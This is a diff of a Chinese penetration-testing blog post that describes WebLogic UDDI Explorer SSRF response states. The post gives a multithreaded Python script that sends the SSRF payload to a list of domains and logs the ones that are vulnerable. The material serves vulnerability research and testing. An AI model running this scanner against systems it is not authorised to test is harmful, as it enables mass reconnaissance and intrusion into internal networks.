@@ -1,206 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>检测 WebLogic 是否存在 SSRF | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>检测 WebLogic 是否存在 SSRF</h1>
-      
-<div class="post-meta">
-    <time>2017-04-14</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>,<a href="/categories/Python">Python</a>](<a href="/tags/ssrf">ssrf</a>)
-</div>
-
-      <div><h3 id="0x00-weblogic返回状态">0x00 weblogic返回状态</h3>
-<p>weblogic的ssrf漏洞测试3种状态，返回如下：</p>
-<ul>
-<li>
-<p>同网段不存在的主机
-<img src="/img/post/weblogic-check-host-down.png" alt=""></p>
-</li>
-<li>
-<p>同网段主机存活但端口不开放
-<img src="/img/post/weblogic-check-host-up-port-down.png" alt=""></p>
-</li>
-<li>
-<p>同网段主机存活且端口开放
-<img src="/img/post/weblogic-check-host-up-port-up.png" alt=""></p>
-</li>
-</ul>
-<h3 id="0x01-检测脚本如下">0x01 检测脚本如下</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python  </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Queue
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests.packages.urllib3.exceptions <span style="color:#f92672">import</span> InsecureRequestWarning
-</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings(InsecureRequestWarning)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>queue <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
-</span></span><span style="display:flex;"><span>mutex <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Lock()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Weblogic_SSRF_Check</span>(threading<span style="color:#f92672">.</span>Thread):
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;docstring for Weblogic_SSRF_Check&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, queue):
-</span></span><span style="display:flex;"><span>        threading<span style="color:#f92672">.</span>Thread<span style="color:#f92672">.</span>__init__(self)
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>queue <span style="color:#f92672">=</span> queue
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(self,domain,ip):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uddiexplorer/SearchPublicRegistries.jsp?operator=</span><span style="color:#e6db74">{ip}</span><span style="color:#e6db74">&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#34;</span><span style="color:#f92672">.</span>format(ip<span style="color:#f92672">=</span>ip)
-</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> domain <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>            html <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>content
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;</span>,html)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> m:
-</span></span><span style="display:flex;"><span>                mutex<span style="color:#f92672">.</span>acquire()
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;ssrf.txt&#39;</span>,<span style="color:#e6db74">&#39;a+&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>                    print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> has weblogic ssrf.&#34;</span> <span style="color:#f92672">%</span> domain
-</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> has weblogic ssrf.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> domain)
-</span></span><span style="display:flex;"><span>                mutex<span style="color:#f92672">.</span>release()
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>,e:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_registry</span>(self,domain):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uddiexplorer/SetupUDDIExplorer.jsp&#39;</span>
-</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> domain <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>            html <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>content
-</span></span><span style="display:flex;"><span>            m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&#39;</span>,html)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> m:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>,e:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>queue<span style="color:#f92672">.</span>empty():
-</span></span><span style="display:flex;"><span>            domain <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>queue<span style="color:#f92672">.</span>get()
-</span></span><span style="display:flex;"><span>            mutex<span style="color:#f92672">.</span>acquire()
-</span></span><span style="display:flex;"><span>            print domain
-</span></span><span style="display:flex;"><span>            mutex<span style="color:#f92672">.</span>release()
-</span></span><span style="display:flex;"><span>            ip <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_registry(domain)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>check(domain,ip)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>queue<span style="color:#f92672">.</span>task_done()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;domain.txt&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span>put(line<span style="color:#f92672">.</span>strip())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
-</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> Weblogic_SSRF_Check(queue)
-</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span>    queue<span style="color:#f92672">.</span>join()
-</span></span></code></pre></div></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>检测 WebLogic 是否存在 SSRF | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>检测 WebLogic 是否存在 SSRF</h1><div class=post-meta><time>2017-04-14</time>
+[<a href=/categories/Pentest>Pentest</a>,<a href=/categories/Python>Python</a>](<a href=/tags/ssrf>ssrf</a>)</div><div><h3 id=0x00-weblogic返回状态>0x00 weblogic返回状态</h3><p>weblogic的ssrf漏洞测试3种状态，返回如下：</p><ul><li><p>同网段不存在的主机
+<img src=/img/post/weblogic-check-host-down.png alt></p></li><li><p>同网段主机存活但端口不开放
+<img src=/img/post/weblogic-check-host-up-port-down.png alt></p></li><li><p>同网段主机存活且端口开放
+<img src=/img/post/weblogic-check-host-up-port-up.png alt></p></li></ul><h3 id=0x01-检测脚本如下>0x01 检测脚本如下</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python  </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> Queue
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> requests.packages.urllib3.exceptions <span style=color:#f92672>import</span> InsecureRequestWarning
+</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>packages<span style=color:#f92672>.</span>urllib3<span style=color:#f92672>.</span>disable_warnings(InsecureRequestWarning)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>queue <span style=color:#f92672>=</span> Queue<span style=color:#f92672>.</span>Queue()
+</span></span><span style=display:flex><span>mutex <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Lock()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Weblogic_SSRF_Check</span>(threading<span style=color:#f92672>.</span>Thread):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;docstring for Weblogic_SSRF_Check&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, queue):
+</span></span><span style=display:flex><span>        threading<span style=color:#f92672>.</span>Thread<span style=color:#f92672>.</span>__init__(self)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>queue <span style=color:#f92672>=</span> queue
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check</span>(self,domain,ip):
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;uddiexplorer/SearchPublicRegistries.jsp?operator=</span><span style=color:#e6db74>{ip}</span><span style=color:#e6db74>&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#34;</span><span style=color:#f92672>.</span>format(ip<span style=color:#f92672>=</span>ip)
+</span></span><span style=display:flex><span>        url <span style=color:#f92672>=</span> domain <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            html <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>15</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)<span style=color:#f92672>.</span>content
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;</span>,html)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> m:
+</span></span><span style=display:flex><span>                mutex<span style=color:#f92672>.</span>acquire()
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;ssrf.txt&#39;</span>,<span style=color:#e6db74>&#39;a+&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>                    print <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> has weblogic ssrf.&#34;</span> <span style=color:#f92672>%</span> domain
+</span></span><span style=display:flex><span>                    f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74> has weblogic ssrf.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> domain)
+</span></span><span style=display:flex><span>                mutex<span style=color:#f92672>.</span>release()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>,e:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_registry</span>(self,domain):
+</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;uddiexplorer/SetupUDDIExplorer.jsp&#39;</span>
+</span></span><span style=display:flex><span>        url <span style=color:#f92672>=</span> domain <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            html <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>15</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)<span style=color:#f92672>.</span>content
+</span></span><span style=display:flex><span>            m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>&#39;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&#39;</span>,html)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> m:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>,e:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> self<span style=color:#f92672>.</span>queue<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>            domain <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>queue<span style=color:#f92672>.</span>get()
+</span></span><span style=display:flex><span>            mutex<span style=color:#f92672>.</span>acquire()
+</span></span><span style=display:flex><span>            print domain
+</span></span><span style=display:flex><span>            mutex<span style=color:#f92672>.</span>release()
+</span></span><span style=display:flex><span>            ip <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>get_registry(domain)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>check(domain,ip)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>queue<span style=color:#f92672>.</span>task_done()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;domain.txt&#39;</span>,<span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>        lines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> lines:
+</span></span><span style=display:flex><span>        queue<span style=color:#f92672>.</span>put(line<span style=color:#f92672>.</span>strip())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>50</span>):
+</span></span><span style=display:flex><span>        t <span style=color:#f92672>=</span> Weblogic_SSRF_Check(queue)
+</span></span><span style=display:flex><span>        t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>        t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>    queue<span style=color:#f92672>.</span>join()
+</span></span></code></pre></div></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
